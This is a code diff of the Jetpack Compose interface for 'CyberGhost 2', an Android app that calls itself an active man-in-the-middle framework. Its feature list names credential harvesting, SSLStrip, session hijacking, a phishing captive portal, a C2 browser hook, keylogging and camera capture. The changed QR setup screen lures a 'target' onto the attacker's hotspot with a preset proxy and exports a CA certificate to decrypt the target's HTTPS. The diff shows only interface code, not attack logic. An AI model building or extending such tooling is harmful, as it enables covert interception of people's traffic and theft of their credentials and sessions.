+    OutlinedTextField(value = text, onValueChange = { text = it; onChange(it.text) },
+        label = { Text(label, fontSize = 10.sp) },
+        textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, color = CgWhite),
+        modifier = Modifier.fillMaxWidth().padding(top = 4.dp), singleLine = true, shape = RoundedCornerShape(8.dp),
+        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg,
+            unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen))
 }
 
 @Composable
 fun ToggleRow(label: String, checked: Boolean, onChange: (Boolean) -> Unit) {
-    Row(Modifier.fillMaxWidth().padding(vertical = 4.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
+    Row(Modifier.fillMaxWidth().padding(vertical = 4.dp),
+        horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
         Text(label, fontSize = 12.sp, color = CgWhite, modifier = Modifier.weight(1f))
-        Switch(checked = checked, onCheckedChange = onChange, colors = SwitchDefaults.colors(checkedTrackColor = CgGreen, uncheckedTrackColor = CgGray))
+        Switch(checked = checked, onCheckedChange = onChange,
+            colors = SwitchDefaults.colors(checkedTrackColor = CgGreen, uncheckedTrackColor = CgGray))
     }
 }
 
 @Composable
 fun SettingsRow(label: String, icon: ImageVector, color: Color, onClick: () -> Unit) {
-    Row(Modifier.fillMaxWidth().clickable(onClick = onClick).padding(vertical = 10.dp), verticalAlignment = Alignment.CenterVertically) {
+    Row(Modifier.fillMaxWidth().clickable(onClick = onClick).padding(vertical = 10.dp),
+        verticalAlignment = Alignment.CenterVertically) {
         Icon(icon, contentDescription = null, tint = color, modifier = Modifier.size(18.dp))
         Spacer(Modifier.width(12.dp))
         Text(label, fontSize = 13.sp, color = CgWhite, modifier = Modifier.weight(1f))
@@ -1107,27 +1271,34 @@ fun SettingsRow(label: String, icon: ImageVector, color: Color, onClick: () -> U
 }
 
 // ============================
-// ABOUT SCREEN
+// ABOUT
 // ============================
 @Composable
 fun AboutScreen() {
-    LazyColumn(Modifier.fillMaxSize().padding(16.dp), horizontalAlignment = Alignment.CenterHorizontally, verticalArrangement = Arrangement.spacedBy(12.dp)) {
+    LazyColumn(Modifier.fillMaxSize().padding(16.dp),
+        horizontalAlignment = Alignment.CenterHorizontally, verticalArrangement = Arrangement.spacedBy(12.dp)) {
         item { Spacer(Modifier.height(12.dp)) }
         item {
-            Box(Modifier.size(80.dp).clip(RoundedCornerShape(20.dp)).background(Brush.linearGradient(listOf(CgGreen.copy(0.3f), CgCyan.copy(0.1f)))), contentAlignment = Alignment.Center) {
+            Box(Modifier.size(80.dp).clip(RoundedCornerShape(20.dp))
+                .background(Brush.linearGradient(listOf(CgGreen.copy(0.3f), CgCyan.copy(0.1f)))),
+                contentAlignment = Alignment.Center) {
                 Text("CG", fontSize = 30.sp, fontWeight = FontWeight.Black, color = CgGreen)
             }
         }
         item { Text("CyberGhost 2", fontSize = 26.sp, fontWeight = FontWeight.Black, color = CgWhite) }
         item { Text("Active MITM Framework for Android", fontSize = 13.sp, color = CgGray) }
-        item { Badge(containerColor = CgGreen.copy(0.2f)) { Text("v2.0", fontSize = 11.sp, color = CgGreen, modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)) } }
-
-        item { HorizontalDivider(color = CgGray.copy(0.2f)) }
-
         item {
-            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgGreen.copy(0.08f)), shape = RoundedCornerShape(16.dp), border = BorderStroke(1.dp, CgGreen.copy(0.2f))) {
+            Badge(containerColor = CgGreen.copy(0.2f)) {
+                Text("v2.0", fontSize = 11.sp, color = CgGreen, modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp))
+            }
+        }
+        item { HorizontalDivider(color = CgGray.copy(0.2f)) }
+        item {
+            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgGreen.copy(0.08f)),
+                shape = RoundedCornerShape(16.dp), border = BorderStroke(1.dp, CgGreen.copy(0.2f))) {
                 Column(Modifier.padding(20.dp), horizontalAlignment = Alignment.CenterHorizontally) {
-                    Box(Modifier.size(52.dp).clip(CircleShape).background(CgGreen.copy(0.15f)), contentAlignment = Alignment.Center) {
+                    Box(Modifier.size(52.dp).clip(CircleShape).background(CgGreen.copy(0.15f)),
+                        contentAlignment = Alignment.Center) {
                         Text("NS", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgGreen)
                     }
                     Spacer(Modifier.height(10.dp))
@@ -1140,39 +1311,27 @@ fun AboutScreen() {
                 }
             }
         }
-
-        item {
-            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
-                Column(Modifier.padding(16.dp)) {
-                    Text("About", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgAmber)
-                    Spacer(Modifier.height(8.dp))
-                    Text("CyberGhost 2 is an advanced man-in-the-middle framework for Android. Turn your device into a transparent WiFi gateway to intercept, inspect, modify, and inject content into all network traffic from connected targets.", fontSize = 12.sp, color = CgGray, lineHeight = 18.sp)
-                }
-            }
-        }
-
         item {
             Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
                 Column(Modifier.padding(16.dp)) {
                     Text("Features", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgAmber)
                     Spacer(Modifier.height(8.dp))
-                    val features = listOf(
-                        "Transparent HTTP/HTTPS interception via DNS redirect",
+                    listOf(
+                        "Transparent HTTP/HTTPS interception via proxy",
                         "SSLStrip — downgrade HTTPS links to HTTP in transit",
                         "Credential harvester — forms, JSON, Basic Auth, Bearer tokens, cookies",
                         "Session hijacker — replay captured cookies in your browser",
-                        "Evil captive portal — intercept targets before granting WiFi access",
+                        "Evil captive portal — phish credentials before granting WiFi",
+                        "QR code proxy setup — one scan configures target's proxy",
                         "Browser hook agent with remote JS execution (C2)",
                         "Keylogging, cookie/storage extraction, form grabbing",
                         "Screenshot and camera capture from hooked browsers",
                         "Network mapping with MAC vendor identification",
                         "WebSocket frame capture",
-                        "Live traffic statistics and bandwidth chart",
+                        "Live traffic stats and bandwidth chart",
                         "HAR export, session snapshots, injection profiles",
-                        "Auto-start on boot, live notification",
-                        "No root required"
-                    )
-                    features.forEach { FeatureItem(it) }
+                        "Auto-start on boot, live notification"
+                    ).forEach { FeatureItem(it) }
                 }
             }
         }
@@ -1190,393 +1349,113 @@ fun FeatureItem(text: String) {
 }
 
 // ============================
-// SHARED COMPONENTS
+// QR SETUP SCREEN
 // ============================
 @Composable
-fun EmptyState(icon: ImageVector, title: String, subtitle: String) {
-    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
-        Column(horizontalAlignment = Alignment.CenterHorizontally, verticalArrangement = Arrangement.spacedBy(8.dp)) {
-            Box(Modifier.size(64.dp).clip(RoundedCornerShape(16.dp)).background(CgGray.copy(0.1f)), contentAlignment = Alignment.Center) {
-                Icon(icon, contentDescription = null, tint = CgGray, modifier = Modifier.size(30.dp))
-            }
-            Text(title, fontSize = 15.sp, color = CgWhite, fontWeight = FontWeight.Medium)
-            Text(subtitle, fontSize = 12.sp, color = CgGray, textAlign = androidx.compose.ui.text.style.TextAlign.Center)
-        }
-    }
-}
-
-fun formatBytes(bytes: Long): String = when {
-    bytes < 1024 -> "$bytes B"
-    bytes < 1024 * 1024 -> "${bytes / 1024} KB"
-    bytes < 1024 * 1024 * 1024 -> "${"%.1f".format(bytes / (1024.0 * 1024.0))} MB"
-    else -> "${"%.2f".format(bytes / (1024.0 * 1024.0 * 1024.0))} GB"
-}
-
-
-// ============================
-// SETUP INSTRUCTIONS SCREEN
-// ============================
-@Composable
-fun SetupScreen(gatewayIp: String, isRunning: Boolean) {
-    LazyColumn(
-        Modifier.fillMaxSize().padding(16.dp),
-        verticalArrangement = Arrangement.spacedBy(12.dp)
-    ) {
-        item {
-            Text("Proxy Setup", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite)
-            Spacer(Modifier.height(4.dp))
-            Text(
-                "Targets must configure their WiFi proxy to route traffic through CyberGhost.",
-                fontSize = 12.sp, color = CgGray, lineHeight = 16.sp
-            )
-        }
-
-        // gateway info card
-        item {
-            Card(
-                Modifier.fillMaxWidth(),
-                colors = CardDefaults.cardColors(containerColor = CgGreen.copy(0.08f)),
-                shape = RoundedCornerShape(12.dp),
-                border = BorderStroke(1.dp, CgGreen.copy(0.3f))
-            ) {
-                Column(Modifier.padding(16.dp)) {
-                    Text("Your Gateway", fontSize = 12.sp, color = CgGray)
-                    Spacer(Modifier.height(6.dp))
-                    Row(verticalAlignment = Alignment.CenterVertically) {
-                        Text(gatewayIp, fontSize = 28.sp, fontWeight = FontWeight.Black, color = CgGreen, fontFamily = FontFamily.Monospace)
-                        Text(":8080", fontSize = 20.sp, color = CgAmber, fontFamily = FontFamily.Monospace)
-                    }
-                    Spacer(Modifier.height(4.dp))
-                    Row(verticalAlignment = Alignment.CenterVertically) {
-                        Box(Modifier.size(8.dp).clip(CircleShape).background(if (isRunning) CgGreen else CgRed))
-                        Spacer(Modifier.width(6.dp))
-                        Text(if (isRunning) "Proxy running" else "Start capture first", fontSize = 11.sp, color = if (isRunning) CgGreen else CgRed)
-                    }
-                }
-            }
-        }
-
-        // android steps
-        item {
-            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
-                Column(Modifier.padding(16.dp)) {
-                    Row(verticalAlignment = Alignment.CenterVertically) {
-                        Box(Modifier.size(28.dp).clip(RoundedCornerShape(6.dp)).background(CgGreen.copy(0.15f)), contentAlignment = Alignment.Center) {
-                            Text("A", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgGreen)
-                        }
-                        Spacer(Modifier.width(10.dp))
-                        Text("Android Setup", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgWhite)
-                    }
-                    Spacer(Modifier.height(12.dp))
-                    SetupStep(1, "Settings → WiFi")
-                    SetupStep(2, "Long press the \"CyberGhost\" hotspot network")
-                    SetupStep(3, "Modify network → Show advanced options")
-                    SetupStep(4, "Proxy → Manual")
-                    SetupStep(5, "Hostname: $gatewayIp")
-                    SetupStep(6, "Port: 8080 → Save")
-                }
-            }
-        }
-
-        // ios steps
-        item {
-            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
-                Column(Modifier.padding(16.dp)) {
-                    Row(verticalAlignment = Alignment.CenterVertically) {
-                        Box(Modifier.size(28.dp).clip(RoundedCornerShape(6.dp)).background(CgCyan.copy(0.15f)), contentAlignment = Alignment.Center) {
-                            Text("i", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgCyan)
-                        }
-                        Spacer(Modifier.width(10.dp))
-                        Text("iOS / iPhone Setup", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgWhite)
-                    }
-                    Spacer(Modifier.height(12.dp))
-                    SetupStep(1, "Settings → WiFi")
-                    SetupStep(2, "Tap ⓘ next to the hotspot network")
-                    SetupStep(3, "HTTP Proxy → Manual")
-                    SetupStep(4, "Server: $gatewayIp")
-                    SetupStep(5, "Port: 8080 → Save")
-                }
-            }
-        }
-
-        // CA cert install
-        item {
-            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgAmber.copy(0.06f)),
-                shape = RoundedCornerShape(12.dp), border = BorderStroke(1.dp, CgAmber.copy(0.2f))) {
-                Column(Modifier.padding(16.dp)) {
-                    Row(verticalAlignment = Alignment.CenterVertically) {
-                        Icon(Icons.Filled.Security, contentDescription = null, tint = CgAmber, modifier = Modifier.size(20.dp))
-                        Spacer(Modifier.width(8.dp))
-                        Text("For HTTPS Decryption", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgAmber)
-                    }
-                    Spacer(Modifier.height(10.dp))
-                    Text("Tap the CA button in CyberGhost → share the cert to the target device", fontSize = 12.sp, color = CgGray, lineHeight = 16.sp)
-                    Spacer(Modifier.height(8.dp))
-                    Text("Android: Settings → Security → Install certificate → CA certificate", fontSize = 11.sp, color = CgGray, lineHeight = 15.sp)
-                    Spacer(Modifier.height(4.dp))
-                    Text("iOS: Settings → General → VPN & Device Management → install cert, then enable it in Certificate Trust Settings", fontSize = 11.sp, color = CgGray, lineHeight = 15.sp)
-                }
-            }
-        }
-
-        // what you'll see
-        item {
-            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
-                Column(Modifier.padding(16.dp)) {
-                    Text("What You'll See", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgWhite)
-                    Spacer(Modifier.height(8.dp))
-                    ResultRow(CgAmber, "HTTP traffic", "visible immediately after proxy set")
-                    ResultRow(CgCyan, "HTTPS traffic", "visible after CA cert installed")
-                    ResultRow(CgRed, "Credentials", "auto-extracted from login forms")
-                    ResultRow(CgMagenta, "Hook agent", "loads when target visits any HTTP page")
-                    ResultRow(CgDimGreen, "DNS queries", "visible after proxy set")
-                }
-            }
-        }
-    }
-}
-
-@Composable
-fun SetupStep(num: Int, text: String) {
-    Row(Modifier.padding(vertical = 4.dp), verticalAlignment = Alignment.Top) {
-        Box(Modifier.size(20.dp).clip(CircleShape).background(CgGreen.copy(0.15f)), contentAlignment = Alignment.Center) {
-            Text("$num", fontSize = 10.sp, color = CgGreen, fontWeight = FontWeight.Bold)
-        }
-        Spacer(Modifier.width(8.dp))
-        Text(text, fontSize = 12.sp, color = CgWhite, lineHeight = 16.sp)
-    }
-}
-
-@Composable
-fun ResultRow(color: Color, label: String, desc: String) {
-    Row(Modifier.padding(vertical = 3.dp), verticalAlignment = Alignment.CenterVertically) {
-        Box(Modifier.size(8.dp).clip(CircleShape).background(color))
-        Spacer(Modifier.width(8.dp))
-        Text("$label: ", fontSize = 11.sp, color = color, fontWeight = FontWeight.SemiBold)
-        Text(desc, fontSize = 11.sp, color = CgGray)
-    }
-}
-
-// DevicesScreen already defined above — this adds networkHosts fallback display
-@Composable
-fun NetworkHostsAsDevices(hosts: List<NetworkHost>) {
-    if (hosts.isEmpty()) return
-    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
-        item {
-            Text("Discovered Hosts", fontSize = 16.sp, fontWeight = FontWeight.Bold, color = CgWhite)
-            Text("From last network scan — tap Setup to configure proxy on these devices", fontSize = 11.sp, color = CgGray, lineHeight = 15.sp)
-        }
-        items(hosts) { host ->
-            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(10.dp)) {
-                Row(Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
-                    Box(Modifier.size(36.dp).clip(RoundedCornerShape(8.dp)).background(
-                        if (host.isGateway) CgGreen.copy(0.15f) else CgCyan.copy(0.1f)), contentAlignment = Alignment.Center) {
-                        Icon(if (host.isGateway) Icons.Filled.Router else Icons.Filled.PhoneAndroid,
-                            contentDescription = null, tint = if (host.isGateway) CgGreen else CgCyan, modifier = Modifier.size(18.dp))
-                    }
-                    Spacer(Modifier.width(10.dp))
-                    Column(Modifier.weight(1f)) {
-                        Text(host.hostname ?: host.ip, fontSize = 13.sp, color = CgWhite, fontWeight = FontWeight.Medium)
-                        if (host.hostname != null) Text(host.ip, fontSize = 10.sp, color = CgGray)
-                        host.mac?.let { Text(it, fontSize = 9.sp, color = CgGray.copy(0.6f)) }
-                    }
-                    Column(horizontalAlignment = Alignment.End) {
-                        host.vendor?.let { Badge(containerColor = CgCyan.copy(0.12f)) { Text(it.take(10), fontSize = 8.sp, color = CgCyan, modifier = Modifier.padding(horizontal = 4.dp)) } }
-                        if (!host.isGateway) {
-                            Spacer(Modifier.height(4.dp))
-                            Text("needs proxy config", fontSize = 8.sp, color = CgAmber)
-                        }
-                    }
-                }
-            }
-        }
-    }
-}
-
-// ============================
-// QR SETUP SCREEN (replaces SetupScreen)
-// ============================
-@Composable
-fun QrSetupScreen(
-    gatewayIp: String,
-    isRunning: Boolean,
-    onExportCa: () -> Unit
-) {
+fun QrSetupScreen(gatewayIp: String, isRunning: Boolean, onExportCa: () -> Unit) {
     var ssid by remember { mutableStateOf(TextFieldValue("CyberGhost")) }
     var password by remember { mutableStateOf(TextFieldValue("cyberghost123")) }
     var showPassword by remember { mutableStateOf(false) }
-    var qrBitmap by remember { mutableStateOf<android.graphics.Bitmap?>(null) }
-    var qrMode by remember { mutableStateOf(0) } // 0=wifi+proxy, 1=proxy only
+    var qrBitmap by remember { mutableStateOf<Bitmap?>(null) }
+    var qrMode by remember { mutableStateOf(0) }
 
-    // regenerate QR whenever inputs change
     LaunchedEffect(ssid.text, password.text, gatewayIp, qrMode) {
         try {
             qrBitmap = when (qrMode) {
                 0 -> com.cyberghost.core.QrGenerator.generateCombinedQr(
                     ssid = ssid.text.ifBlank { "CyberGhost" },
                     password = password.text.ifBlank { "cyberghost123" },
-                    proxyHost = gatewayIp,
-                    proxyPort = 8080,
-                    size = 600
+                    proxyHost = gatewayIp, proxyPort = 8080, size = 600
                 )
                 else -> com.cyberghost.core.QrGenerator.generateProxyOnlyQr(
-                    proxyHost = gatewayIp,
-                    proxyPort = 8080,
-                    size = 600
+                    proxyHost = gatewayIp, proxyPort = 8080, size = 600
                 )
             }
         } catch (_: Exception) {}
     }
 
-    LazyColumn(
-        Modifier.fillMaxSize().padding(16.dp),
-        verticalArrangement = Arrangement.spacedBy(12.dp)
-    ) {
+    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
         item {
-            Text("Quick Connect", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite)
+            Text("QR Proxy Setup", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite)
+            Spacer(Modifier.height(4.dp))
             Text("Target scans this QR to join your hotspot with proxy pre-configured.", fontSize = 12.sp, color = CgGray)
         }
 
-        // status
         item {
-            Card(
-                Modifier.fillMaxWidth(),
-                colors = CardDefaults.cardColors(
-                    containerColor = if (isRunning) CgGreen.copy(0.08f) else CgRed.copy(0.08f)
-                ),
+            Card(Modifier.fillMaxWidth(),
+                colors = CardDefaults.cardColors(containerColor = if (isRunning) CgGreen.copy(0.08f) else CgRed.copy(0.08f)),
                 shape = RoundedCornerShape(10.dp),
-                border = BorderStroke(1.dp, if (isRunning) CgGreen.copy(0.3f) else CgRed.copy(0.3f))
-            ) {
+                border = BorderStroke(1.dp, if (isRunning) CgGreen.copy(0.3f) else CgRed.copy(0.3f))) {
                 Row(Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
                     Box(Modifier.size(8.dp).clip(CircleShape).background(if (isRunning) CgGreen else CgRed))
                     Spacer(Modifier.width(8.dp))
-                    Text(
-                        if (isRunning) "Proxy running on $gatewayIp:8080"
+                    Text(if (isRunning) "Proxy active on $gatewayIp:8080"
                         else "Start capture first, then share this QR",
-                        fontSize = 12.sp, color = if (isRunning) CgGreen else CgRed
-                    )
+                        fontSize = 12.sp, color = if (isRunning) CgGreen else CgRed)
                 }
             }
         }
 
-        // QR mode selector
         item {
             Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
-                FilterChip(
-                    selected = qrMode == 0,
-                    onClick = { qrMode = 0 },
-                    label = { Text("WiFi + Proxy", fontSize = 11.sp) },
-                    modifier = Modifier.weight(1f),
+                FilterChip(selected = qrMode == 0, onClick = { qrMode = 0 },
+                    label = { Text("WiFi + Proxy", fontSize = 11.sp) }, modifier = Modifier.weight(1f),
                     colors = FilterChipDefaults.filterChipColors(
-                        selectedContainerColor = CgGreen.copy(0.2f),
-                        selectedLabelColor = CgGreen
-                    )
-                )
-                FilterChip(
-                    selected = qrMode == 1,
-                    onClick = { qrMode = 1 },
-                    label = { Text("Proxy Only", fontSize = 11.sp) },
-                    modifier = Modifier.weight(1f),
+                        selectedContainerColor = CgGreen.copy(0.2f), selectedLabelColor = CgGreen))
+                FilterChip(selected = qrMode == 1, onClick = { qrMode = 1 },
+                    label = { Text("Proxy Only", fontSize = 11.sp) }, modifier = Modifier.weight(1f),
                     colors = FilterChipDefaults.filterChipColors(
-                        selectedContainerColor = CgCyan.copy(0.2f),
-                        selectedLabelColor = CgCyan
-                    )
-                )
+                        selectedContainerColor = CgCyan.copy(0.2f), selectedLabelColor = CgCyan))
             }
         }
 
-        // hotspot config (only for wifi+proxy mode)
         if (qrMode == 0) {
             item {
-                Card(
-                    Modifier.fillMaxWidth(),
-                    colors = CardDefaults.cardColors(containerColor = CgCard),
-                    shape = RoundedCornerShape(12.dp)
-                ) {
-                    Column(Modifier.padding(14.dp)) {
-                        Text("Hotspot Credentials", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgAmber)
-                        Text("Must match your actual hotspot name and password", fontSize = 10.sp, color = CgGray)
-                        Spacer(Modifier.height(10.dp))
-                        OutlinedTextField(
-                            value = ssid, onValueChange = { ssid = it },
-                            label = { Text("Hotspot Name (SSID)", fontSize = 10.sp) },
-                            textStyle = androidx.compose.ui.text.TextStyle(fontSize = 13.sp, color = CgWhite),
-                            modifier = Modifier.fillMaxWidth(), singleLine = true,
-                            shape = RoundedCornerShape(8.dp),
-                            colors = OutlinedTextFieldDefaults.colors(
-                                unfocusedContainerColor = CgBg, focusedContainerColor = CgBg,
-                                unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen
-                            )
-                        )
-                        Spacer(Modifier.height(8.dp))
-                        OutlinedTextField(
-                            value = password, onValueChange = { password = it },
-                            label = { Text("Hotspot Password", fontSize = 10.sp) },
-                            textStyle = androidx.compose.ui.text.TextStyle(fontSize = 13.sp, color = CgWhite),
-                            visualTransformation = if (showPassword)
-                                androidx.compose.ui.text.input.VisualTransformation.None
-                            else
-                                androidx.compose.ui.text.input.PasswordVisualTransformation(),
-                            trailingIcon = {
-                                IconButton(onClick = { showPassword = !showPassword }) {
-                                    Icon(
-                                        if (showPassword) Icons.Filled.VisibilityOff else Icons.Filled.Visibility,
-                                        contentDescription = null, tint = CgGray, modifier = Modifier.size(18.dp)
-                                    )
-                                }
-                            },
-                            modifier = Modifier.fillMaxWidth(), singleLine = true,
-                            shape = RoundedCornerShape(8.dp),
-                            colors = OutlinedTextFieldDefaults.colors(
-                                unfocusedContainerColor = CgBg, focusedContainerColor = CgBg,
-                                unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen
-                            )
-                        )
-                    }
+                CgCard {
+                    Text("Hotspot Credentials", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgAmber)
+                    Text("Must match your actual hotspot name and password", fontSize = 10.sp, color = CgGray)
+                    Spacer(Modifier.height(10.dp))
+                    OutlinedTextField(value = ssid, onValueChange = { ssid = it },
+                        label = { Text("Hotspot Name (SSID)", fontSize = 10.sp) },
+                        textStyle = androidx.compose.ui.text.TextStyle(fontSize = 13.sp, color = CgWhite),
+                        modifier = Modifier.fillMaxWidth(), singleLine = true, shape = RoundedCornerShape(8.dp),
+                        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg,
+                            unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen))
+                    Spacer(Modifier.height(8.dp))
+                    OutlinedTextField(value = password, onValueChange = { password = it },
+                        label = { Text("Hotspot Password", fontSize = 10.sp) },
+                        textStyle = androidx.compose.ui.text.TextStyle(fontSize = 13.sp, color = CgWhite),
+                        visualTransformation = if (showPassword) VisualTransformation.None else PasswordVisualTransformation(),
+                        trailingIcon = {
+                            IconButton(onClick = { showPassword = !showPassword }) {
+                                Icon(if (showPassword) Icons.Filled.VisibilityOff else Icons.Filled.Visibility,
+                                    contentDescription = null, tint = CgGray, modifier = Modifier.size(18.dp))
+                            }
+                        },
+                        modifier = Modifier.fillMaxWidth(), singleLine = true, shape = RoundedCornerShape(8.dp),
+                        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg,
+                            unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen))
                 }
             }
         }
 
-        // QR code display
         item {
-            Card(
-                Modifier.fillMaxWidth(),
-                colors = CardDefaults.cardColors(containerColor = CgCard),
-                shape = RoundedCornerShape(16.dp)
-            ) {
-                Column(
-                    Modifier.fillMaxWidth().padding(20.dp),
-                    horizontalAlignment = Alignment.CenterHorizontally
-                ) {
-                    Text(
-                        if (qrMode == 0) "Scan to Join + Set Proxy" else "Scan to Set Proxy",
-                        fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgWhite
-                    )
+            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(16.dp)) {
+                Column(Modifier.fillMaxWidth().padding(20.dp), horizontalAlignment = Alignment.CenterHorizontally) {
+                    Text(if (qrMode == 0) "Scan to Join + Set Proxy" else "Scan to Set Proxy",
+                        fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgWhite)
                     Spacer(Modifier.height(16.dp))
 
-                    qrBitmap?.let { bmp ->
-                        // white background for QR visibility
-                        Box(
-                            Modifier.size(260.dp).clip(RoundedCornerShape(12.dp)).background(Color.White).padding(12.dp),
-                            contentAlignment = Alignment.Center
-                        ) {
-                            androidx.compose.foundation.layout.Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) { androidx.compose.foundation.Image(
-                                bitmap = bmp.toComposeImageBitmap(),
-                                contentDescription = "QR Code",
-                                modifier = Modifier.fillMaxSize()
-                            )
-                        }
-                    } ?: Box(
-                        Modifier.size(260.dp).clip(RoundedCornerShape(12.dp)).background(Color.White),
-                        contentAlignment = Alignment.Center
-                    ) {
-                        CircularProgressIndicator(color = CgGreen, modifier = Modifier.size(32.dp))
+                    Box(Modifier.size(260.dp).clip(RoundedCornerShape(12.dp)).background(Color.White).padding(12.dp),
+                        contentAlignment = Alignment.Center) {
+                        qrBitmap?.let { bmp ->
+                            Image(bitmap = bmp.asImageBitmap(), contentDescription = "QR Code",
+                                modifier = Modifier.fillMaxSize())
+                        } ?: CircularProgressIndicator(color = CgGreen, modifier = Modifier.size(32.dp))
                     }
 
                     Spacer(Modifier.height(12.dp))
-
-                    // proxy info under QR
-                    Row(horizontalArrangement = Arrangement.spacedBy(16.dp)) {
+                    Row(horizontalArrangement = Arrangement.spacedBy(20.dp)) {
                         Column(horizontalAlignment = Alignment.CenterHorizontally) {
                             Text("PROXY", fontSize = 9.sp, color = CgGray, letterSpacing = 1.sp)
                             Text(gatewayIp, fontSize = 12.sp, color = CgGreen, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
@@ -1588,7 +1467,7 @@ fun QrSetupScreen(
                         if (qrMode == 0) {
                             Column(horizontalAlignment = Alignment.CenterHorizontally) {
                                 Text("SSID", fontSize = 9.sp, color = CgGray, letterSpacing = 1.sp)
-                                Text(ssid.text.take(12), fontSize = 12.sp, color = CgCyan, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
+                                Text(ssid.text.take(10), fontSize = 12.sp, color = CgCyan, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
                             }
                         }
                     }
@@ -1596,30 +1475,17 @@ fun QrSetupScreen(
             }
         }
 
-        // CA cert export
         item {
-            Card(
-                Modifier.fillMaxWidth(),
-                colors = CardDefaults.cardColors(containerColor = CgAmber.copy(0.06f)),
-                shape = RoundedCornerShape(12.dp),
-                border = BorderStroke(1.dp, CgAmber.copy(0.2f))
-            ) {
-                Row(
-                    Modifier.fillMaxWidth().padding(14.dp),
-                    horizontalArrangement = Arrangement.SpaceBetween,
-                    verticalAlignment = Alignment.CenterVertically
-                ) {
+            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgAmber.copy(0.06f)),
+                shape = RoundedCornerShape(12.dp), border = BorderStroke(1.dp, CgAmber.copy(0.2f))) {
+                Row(Modifier.fillMaxWidth().padding(14.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                     Column(Modifier.weight(1f)) {
                         Text("Step 2: Install CA Cert", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgAmber)
-                        Text("Required for HTTPS decryption. Share after target connects.", fontSize = 11.sp, color = CgGray, lineHeight = 15.sp)
+                        Text("Required for HTTPS decryption.", fontSize = 11.sp, color = CgGray)
                     }
-                    Spacer(Modifier.width(8.dp))
-                    Button(
-                        onClick = onExportCa,
+                    Button(onClick = onExportCa,
                         colors = ButtonDefaults.buttonColors(containerColor = CgAmber.copy(0.2f)),
-                        shape = RoundedCornerShape(8.dp),
-                        border = BorderStroke(1.dp, CgAmber.copy(0.4f))
-                    ) {
+                        shape = RoundedCornerShape(8.dp), border = BorderStroke(1.dp, CgAmber.copy(0.4f))) {
                         Icon(Icons.Filled.Security, contentDescription = null, tint = CgAmber, modifier = Modifier.size(16.dp))
                         Spacer(Modifier.width(4.dp))
                         Text("Export CA", color = CgAmber, fontSize = 12.sp)
@@ -1628,28 +1494,27 @@ fun QrSetupScreen(
             }
         }
 
-        // manual instructions fallback
         item {
-            Card(
-                Modifier.fillMaxWidth(),
-                colors = CardDefaults.cardColors(containerColor = CgCard),
-                shape = RoundedCornerShape(12.dp)
-            ) {
-                Column(Modifier.padding(14.dp)) {
-                    Text("Manual Setup (if QR doesn't work)", fontSize = 12.sp, fontWeight = FontWeight.SemiBold, color = CgGray)
-                    Spacer(Modifier.height(8.dp))
